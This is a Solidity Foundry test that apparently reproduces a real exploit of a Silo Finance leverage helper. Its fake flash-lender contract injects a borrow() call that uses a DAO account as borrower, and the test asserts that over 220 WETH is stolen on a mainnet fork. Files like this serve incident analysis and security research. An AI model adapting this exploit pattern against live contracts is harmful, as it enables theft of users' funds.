// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost: ~545K USD
// Attacker: https://etherscan.io/address/0x04377cfaF4b4A44bb84042218cdDa4cEBCf8fd62
// Attack Tx: https://etherscan.io/tx/0x1f15a193db3f44713d56c4be6679b194f78c2bcdd2ced5b0c7495b7406f5e87a
// Vulnerable Contract: https://etherscan.io/address/0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9
//
// The experimental leverage helper accepted an arbitrary exchange target and
// calldata. A malicious flash lender makes the helper execute Silo.borrow(),
// using the DAO account as borrower and the attacker as receiver.

interface ILeverageHelper {
    struct FlashArgs {
        address flashloanTarget;
        uint256 amount;
    }

    struct DepositArgs {
        address silo;
        uint256 amount;
        uint8 collateralType;
    }

    function openLeveragePosition(
        FlashArgs calldata flashArgs,
        bytes calldata swapArgs,
        DepositArgs calldata depositArgs
    ) external payable;
}

interface IERC3156Borrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

contract MaliciousFlashLender {
    struct SwapArgs {
        address exchangeProxy;
        address sellToken;
        address buyToken;
        address allowanceTarget;
        bytes swapCallData;
    }

    ILeverageHelper private constant LEVERAGE = ILeverageHelper(0xCbEe4617ABF667830fe3ee7DC8d6f46380829DF9);
    address private constant SILO = 0x160287E2D3fdCDE9E91317982fc1Cc01C1f94085;
    address private constant VICTIM = 0x60BAF994f44dd10c19C0c47cbFE6048a4fFe4860;

    function attack() external {
        bytes memory borrowCall =
            abi.encodeWithSignature("borrow(uint256,address,address)", 224 ether, address(this), VICTIM);
        bytes memory swapArgs = abi.encode(SwapArgs(SILO, address(this), address(this), address(this), borrowCall));

        LEVERAGE.openLeveragePosition(
            ILeverageHelper.FlashArgs(address(this), 0), swapArgs, ILeverageHelper.DepositArgs(address(this), 0, 1)
        );
    }

    function config() external view returns (address) {
        return address(this);
    }

    function asset() external view returns (address) {
        return address(this);
    }

    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        IERC3156Borrower(receiver).onFlashLoan(msg.sender, token, amount, 0, data);
        return true;
    }

    function balanceOf(
        address
    ) external pure returns (uint256) {
        return 1;
    }

    function allowance(
        address,
        address
    ) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function deposit(
        uint256,
        address,
        uint8
    ) external pure returns (uint256 shares) {
        return 1;
    }

    function getSilos() external view returns (address silo0, address silo1) {
        return (address(this), address(this));
    }

    function borrow(
        uint256,
        address,
        address
    ) external pure returns (uint256 shares) {
        return 0;
    }
}

contract SiloFinanceExploitTest is Test {
    IERC20 private constant WETH_TOKEN = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint256 private constant FORK_BLOCK = 22_781_961;

    function setUp() public {
        vm.createSelectFork("https://eth.drpc.org", FORK_BLOCK);
    }

    function testExploit() public {
        MaliciousFlashLender attacker = new MaliciousFlashLender();

        attacker.attack();

        uint256 stolen = WETH_TOKEN.balanceOf(address(attacker));
        emit log_named_decimal_uint("Stolen WETH", stolen, 18);
        assertGt(stolen, 220 ether);
    }
}
